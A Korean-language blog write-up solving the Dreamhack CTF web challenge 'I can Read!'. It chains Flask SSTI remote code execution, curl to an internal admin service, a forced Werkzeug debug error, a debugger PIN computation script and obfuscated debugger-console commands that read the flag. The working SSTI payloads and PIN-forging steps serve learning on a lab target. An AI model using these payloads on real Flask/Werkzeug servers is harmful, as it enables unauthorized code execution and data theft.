---
layout: post
title: Dreamhack | I can Read!
subtitle: I can Read! 문제 풀이
categories: Web
tags: [dreamhack, Pentest, Web]
---

**본 문제는 dreamhack.io를 통해서 풀어 보실 수 있습니다.**

**해답을 이해하며 생각을 해보면서 풀이 해보시길 바랍니다.**

## 문제 내용

<p align="center">
<img src ="https://github.com/peoplstar/peoplstar.github.io/assets/78135526/225c76a2-9faa-4040-ba23-f1cd4317fb39" width = 850>
</p>

## 문제 분석

### main SSTI

제공되는 문제 링크를 접속하면 **HELLO**만 출력된다. 제공 받은 파일을 통해 분석을 진행하도록 합니다.

```python
# main.py
from flask import Flask,render_template, render_template_string

app = Flask(__name__)
blacklist =[]

@app.route('/')
def index():
    return render_template('index.html')


@app.route('/<path:s>')
def E404(s):
    page = f'''
    <h1>404 : {s} Not Found</h1>
    <p>The requested URL was not found on this server.</p>
    '''
    return render_template_string(page)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)

```

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>index</title>
</head>
<body>
    <h1>Hello</h1>
    <!-- admin page is reparing now :( -->
    <!-- * The admin page is debugging on the internal network port 8000 * -->
</body>
</html>
```

현재 `main.py`를 통해서 얻을 수 있는 정보는 5000번의 포트를 사용하고 **admin page**는 `8000`번의 포트를 사용하고 있다는 것이다.

또한 `/` 경로로부터 입력 받은 내용에 대해서 `render_template_string` 템플릿을 형성하고 있는 것을 알 수 있다.

이는 **SSTI** 취약점이 발생하기에 `{{7*7}}`를 입력하여 적용되는지 확인해본다.

<p align="center">
<img src ="https://github.com/peoplstar/peoplstar.github.io/assets/78135526/18ea4dcd-7f3c-4aea-8f6e-5df0fb483da6" width = 850>
</p>

입력한 내용에 대해서 서버측에서 실행되어 적용되는 템플릿이 나오는 것을 알 수 있다. 이후 RCE를 진행할 수 있는 코드를 작성하여 삽입하면 아래와 같이 현재 서버측에서 코드를 실행하여 나온 결과를 출력할 수 있다.

```
{{ ''.__class__.__mro__[1].__subclasses__()[398]('ls',shell=True,stdout=-1).communicate() }}
```

<p align="center">
<img src ="https://github.com/peoplstar/peoplstar.github.io/assets/78135526/7ab54378-681e-45e2-bf85-65a0f1acd90c" width = 850>
</p>

### Admin 

```python
#!/usr/bin/python3
from flask import Flask
import hashlib

app = Flask(__name__)


@app.route('/')
def index():
    return "ADMIN PAGE!"

@app.route('/keygen/<path:string>')
def keygen(string):
    n = len(string)-1
    a = hashlib.md5(string.encode('utf-8'))
    res = len(string), str(hex(int(int(a.hexdigest(),16)/n)))

    return f"{res}"

if __name__ == '__main__':
    app.run(debug=True,host='0.0.0.0', port=8000)
```

관리자 페이지를 확인해보면 `8000`의 포트 번호를 사용하고 있는 것을 알 수 있다. 또한 `keygen` 함수를 확인해보면 입력 받은 값을 통해서 `res`를 연산하게 되는데 입력 값이 **1**인 경우 0으로 나누기에 `ZeroDivionError`가 발생할 것을 예상할 수 있다.

또한, 현재 `debug=True`를 설정하였기에 이 에러를 발생시키게 된다면 Debug 모드로 넘어갈 것을 예상할 수 있다.

그렇다면 현재 URL을 통해서 Debug로 연결하기 위해서는 어떤 방법이 있을지 확인해본다.

```Dockerfile
# FROM ubuntu:20.04
FROM python:3.8

# RUN apt update && apt install -y python3.8
# RUN apt install python3-pip -y
RUN apt install curl -y
RUN pip3 install flask

WORKDIR /var/www/
COPY main ./main/
COPY admin ./admin/
RUN chmod 755 /var/www/
COPY flag /
RUN chmod 700 /flag
ADD run.sh /run.sh
RUN useradd user
CMD ["/run.sh"]

EXPOSE 5000
```

**Dockerfile**을 확인해보면 현재 해당 Docker는 5000번 포트로 실행되고 있고 설치된 모듈로는 `flask, curl` 이 두 가지 이다.

처음에는 SSH 터널링과 같이 포트를 직접 연결할 생각을 하였지만 모듈로만 풀이해야한다면 `curl` 하나로 풀이를 진행해야한다.

현재 RCE가 가능하기에 내부에서 작동하는 `8000` 포트의 Admin과 통신이 되는지 확인해보도록 한다.

```
{{ ''.__class__.__mro__[1].__subclasses__()[398]('curl 127.0.0.1:8000',shell=True,stdout=-1).communicate() }}
```

<p align="center">
<img src ="https://github.com/peoplstar/peoplstar.github.io/assets/78135526/d51ccfc5-3d6f-4570-828a-c2e15b2d02c3" width = 850>
</p>

8000 포트를 사용하고 있는 Admin 접근이 가능한 것을 확인하였고 이후 `/keygen/1`을 통해 Debug 모드가 되는지 본다.

<p align="center">
<img src ="https://github.com/peoplstar/peoplstar.github.io/assets/78135526/f05a1f04-fa49-4671-bc6f-0295aff1714a" width = 850>
</p>

내용을 확인해보면 예상대로 `ZeroDivisionError`로 인한 Debug mode가 정상적으로 실행되는 것을 알 수 있다.

이후 Debug 모드에선 **Werkzeug Pincode exploit**이 가능하지만 모든 내용이 byte를 통해서 출력되기에 로컬에서 테스트를 하며 진행하겠습니다.

### Local Pin Code Exploit

<p align="center">
<img src ="https://github.com/peoplstar/peoplstar.github.io/assets/78135526/e24ebd4e-5e30-4aab-90ae-cceb005668b0" width = 850>
</p>

* Debug Console를 사용하기 위해서는 위처럼 Pin code 인증 절차가 필요하게 되는데 이 때 확인되는 로그는 아래와 같다.

```log
127.0.0.1 - - [08/Dec/2023 14:36:05] "GET /keygen/a?__debugger__=yes&cmd=printpin&s=AgVjhE4NHyHMvgGuD1Yz HTTP/1.1
```

* 여기서 알 수 있는 것은 `cmd` 파리미터를 통해 어떤 행동을 할 지 정해지는 것과, `s`라는 파라미터는 `Flask Secret Key`임을 알 수 있다. 해당 `Secret Key`는 **F12** 개발자 도구를 통해서도 확인이 가능하다.

<p align="center">
<img src ="https://github.com/peoplstar/peoplstar.github.io/assets/78135526/6d401e5e-2af7-4871-9249-ec4fc01bb03f" width = 850>
</p>

* 해당 화면은 인증이 완료되고 로그에서 확인되는 내용을 URL로 직접 연결하면 위와 같이 `"auth" : true`로 Pin code 인증이 완료되었다는 것을 알 수 있다.

```log
127.0.0.1 - - [08/Dec/2023 14:38:30] "GET /keygen/a?__debugger__=yes&cmd=pinauth&pin=408-915-900&s=AgVjhE4NHyHMvgGuD1Yz HTTP/1.1" 200
```

<p align="center">
<img src ="https://github.com/peoplstar/peoplstar.github.io/assets/78135526/0808ca80-780a-43d9-a386-957587fc70a4" width = 850>
</p>

인증이 완료되면 인증에 대한 Cookie가 적용되는 것을 알 수 있는데 이후 해당 Cookie 값 없이 Command를 전송하게 되면 Pin code 인증이 되지 않은 것처럼 작동하기에 **해당 Cookie 값이 중요하다**. **(~~이 부분에서 한참을 헤맸다...~~)**

<p align="center">
<img src ="https://github.com/peoplstar/peoplstar.github.io/assets/78135526/5f24d399-92d4-4820-837e-12218eac0cb0" width = 850>
</p>

인증을 완료하고 Debug Console을 통해서 Command를 전송하게 되면 아래와 같이 Log가 남게 되는데 `frm`의 파라미터는 개발자 도구에서 확인한거와 같이 사용하고 있는 Console의 `frame number`가 된다.

```log
127.0.0.1 - - [08/Dec/2023 14:40:54] "GET /keygen/a?&__debugger__=yes&cmd=print('peoplstar')&frm=2088523955456&s=AgVjhE4NHyHMvgGuD1Yz HTTP/1.1" 200 -
```

Remote 환경에서는 위 처럼 View가 제공되는 것이 아닌 Byte로 제공되기에 확인한 Log 정보를 이용하여 `curl`로 전송할 것이다.

### Remote 정보 수집

실질적으로 해당 Debug 환경에서 Command를 전송하기 위해서는 Pin-code가 필요하다. 해당 내용은 [Peoplstar's Note](https://peoplstar.github.io/web/2023/10/05/web-flask-dev.html)에서 이미 언급하였기에 Pin code create 부분을 생략하겠습니다.

**Pin code 생성하는 파일** : `werkzeug-2.2.2\werkzeug-2.2.2\src\werkzeug\debug\__init__.py`

* **Mac Address** : aa:fc:00:01:5d:01

* **/etc/machine-id, /proc/sys/kernel/random/boot_id** : 68b7c399-244d-470b-b6fa-1efd3c0a294e
    
    * `__init__.py` 57 line : `for filename in "/etc/machine-id", "/proc/sys/kernel/random/boot_id"`

* **/proc/self/cgroup** : libpod-ab9607f5d4e7586b770c3cbdee2f6569cf38521c027de1b0e9033c393418aa0f

```python
import hashlib
import typing as t
from itertools import chain
    
def get_pin_and_cookie_name(
) -> t.Union[t.Tuple[str, str], t.Tuple[None, None]]:    
    rv = None
    num = None

    # This information only exists to make the cookie unique on the
    # computer, not as a security feature.
    probably_public_bits = [
        'root',
        'flask.app',
        'Flask',
        '/usr/local/lib/python3.8/site-packages/flask/app.py', 
    ]

    # This information is here to make it harder for an attacker to
    # guess the cookie name.  They are unlikely to be contained anywhere
    # within the unauthenticated debug page.
    private_bits = [
        '187999308569857', # /sys/class/net/eth0/address Integer convert
        b'68b7c399-244d-470b-b6fa-1efd3c0a294elibpod-ab9607f5d4e7586b770c3cbdee2f6569cf38521c027de1b0e9033c393418aa0f' # /proc/sys/kernel/random/boot_id + /proc/self/cgroup
    ]

    h = hashlib.sha1()
    for bit in chain(probably_public_bits, private_bits):
        if not bit:
            continue
        if isinstance(bit, str):
            bit = bit.encode("utf-8")
        h.update(bit)
    h.update(b"cookiesalt")

    # If we need to generate a pin we salt it a bit more so that we don't
    # end up with the same value and generate out 9 digits
    if num is None:
        h.update(b"pinsalt")
        num = f"{int(h.hexdigest(), 16):09d}"[:9]

    # Format the pincode in groups of digits for easier remembering if
    # we don't have a result yet.
    if rv is None:
        for group_size in 5, 4, 3:
            if len(num) % group_size == 0:
                rv = "-".join(
                    num[x : x + group_size].rjust(group_size, "0")
                    for x in range(0, len(num), group_size)
                )
                break
        else:
            rv = num

    return rv

print(get_pin_and_cookie_name())
```

<p align="center">
<img src ="https://github.com/peoplstar/peoplstar.github.io/assets/78135526/98d57628-987a-4849-9a6d-fe17643e4b6b" width = 850>
</p>

* **Secret Key** : PU1SKs7zR9IOYtG3qy3k

* **Frame Number** : 139805351218192

143-054-970

### Exploit

생성한 Pin Code와 이전에 확인하였던 Log를 통해서 `curl`로 접속을 시도해보겠습니다.

<p align="center">
<img src ="https://github.com/peoplstar/peoplstar.github.io/assets/78135526/07a1fc28-06ef-4047-9c26-5902cb34948f" width = 850>
</p>

```
http://host3.dreamhack.games:19145/%7B%7B%20''.__class__.__mro__[1].__subclasses__()[398]('curl%20127.0.0.1:8000/keygen/a?__debugger__=yes&cmd=printpin&s=PU1SKs7zR9IOYtG3qy3k%27,shell=True,stdout=-1).communicate()%20%7D%7D
```

접속하게 되면 `Internal Server Error`가 발생한다. 해당 내용을 깊이 확인해보니 우리는 `curl` 명령어를 사용하면서 매개변수를 `a?` 이와 같이 넘기게 된다.

하지만 URL에서 1차적으로는 `host3.dreamhack.games`의 매겨변수로 판단하게 되어 위와 같은 에러가 발생한다.

`?` 문자를 사용하지 않고 GET 메소드를 넘기기 위해서 `-G -d` 옵션을 추가하면 해결이 가능하다.

`curl -G -d "__debugger__=yes&cmd=printpin&s=PU1SKs7zR9IOYtG3qy3k" http://127.0.0.1:8000/keygen/1`

이를 통해서 `printpin`를 하게 되면 정상적으로 작동하는 것을 확인할 수 있고 이후 Pin code 인증을 시도하는데 인증 이후 Cookies 값을 반환 받아야 한다.

하지만 현재 XSS와 같은 스크립트 삽입을 통한 Cookies 탈취가 불가능하고 현재 사용되고 있는 프로세스의 권한은 `user` 이기에 디렉토리 쓰기가 쉽지 않다.

하지만 리눅스 환경에서 누구나 쓰기가 가능한 `/tmp` 디렉토리에 Cookies 값을 저장하여 확인하면 가능하다. 이 옵션은 `-c /director/file` 을 통해 Cookies 값을 생성할 수 있다.

따라서 아래와 같은 코드를 이용하여 인증과 Cookie 생성을 동시에 진행한다.


```
curl -G -c /tmp/cookies.txt -d "__debugger__=yes&cmd=pinauth&pin=143-054-970&s=PU1SKs7zR9IOYtG3qy3k" http://127.0.0.1:8000/keygen/1
```

<p align="center">
<img src ="https://github.com/peoplstar/peoplstar.github.io/assets/78135526/a36cf906-11a3-49f1-ba92-b5c0bd8c0c2e" width = 850>
</p>

* **인증 완료**

<p align="center">
<img src ="https://github.com/peoplstar/peoplstar.github.io/assets/78135526/dea728df-9b55-484d-aacf-d526c8e5bab3" width = 850>
</p>

* **`cat /tmp/cookies.txt`로 생성한 쿠키 값 확인**

이후 테스트용 `print(1234)` command를 전송해보도록 하겠습니다.

<p align="center">
<img src ="https://github.com/peoplstar/peoplstar.github.io/assets/78135526/e029e786-94f8-41ed-854a-b8ea3463b5a9" width = 850>
</p>

```
curl -G -b "__wzd1269d62cc39251a92215=1702019287|8d0c77c4160d" -d "__debugger__=yes&cmd=print(1234)&frm=139805351218192&s=PU1SKs7zR9IOYtG3qy3k" http://127.0.0.1:8000/keygen/1
```

입력한 Command와 결과가 정상적으로 출력되는 것을 확인 할 수 있다.

이후 `__import__("os").popen("cat%2b/flag.txt").read()`를 진행하려고 하였으나 `', "`에 대한 문자가 사라지는 것을 확인할 수 있다.

여기서 너무나도 많은 시간을 쏟고 풀이가 복잡하게 되었다. 띄워쓰기 및 `+, ', "` 등등 특수문자에 대해서 제대로 진행되지 않아 문자열을 하나하나 ASCII 코드로 파싱하여 문자열을 추가하고 `join`하는 방식으로 진행하여 최종 Exploit이 보기 힘들 수준이다.

여기서 진행했던 내용은 특수문자에 대해서 `host3.dreamhack.games` URL에서 1차적으로 특수문자 디코딩이 진행되는데 이후에 `curl`에서 한번 더 진행되기에 기존 문자를 통해 정상적으로 전달이 되지 않았던 것이었다.

따라서 사용한 일부 특수문자는 Double Encoding하여 삽입한 결과 정상적으로 작동하여 FLAG를 확인할 수 있었다.

마지막 코드는 약간의 난독화 느낌으로 되어 있지만 단순하기에 금방 이해가 가능하다.

```
curl -G -b "__wzd1269d62cc39251a92215=1702019287|8d0c77c4160d" -d "__debugger__=yes&cmd=o=[chr(111),chr(115)];p=[chr(112),chr(111),chr(112),chr(101),chr(110)];l=[chr(99),chr(97),chr(116),chr(32),chr(47),chr(102),chr(108),chr(97),chr(103)];print(getattr(__import__(%2522%2522.join(o)),%2522%2522.join(p))(%2522%2522.join(l)).read())&frm=139805351218192&s=PU1SKs7zR9IOYtG3qy3k" http://127.0.0.1:8000/keygen/1
```

<p align="center">
<img src ="https://github.com/peoplstar/peoplstar.github.io/assets/78135526/1e9fac13-166c-498d-8dc4-58b6deb96756" width = 850>
</p>

* **참고** : [me2nuk](https://me2nuk.com/SSTI-Vulnerability/)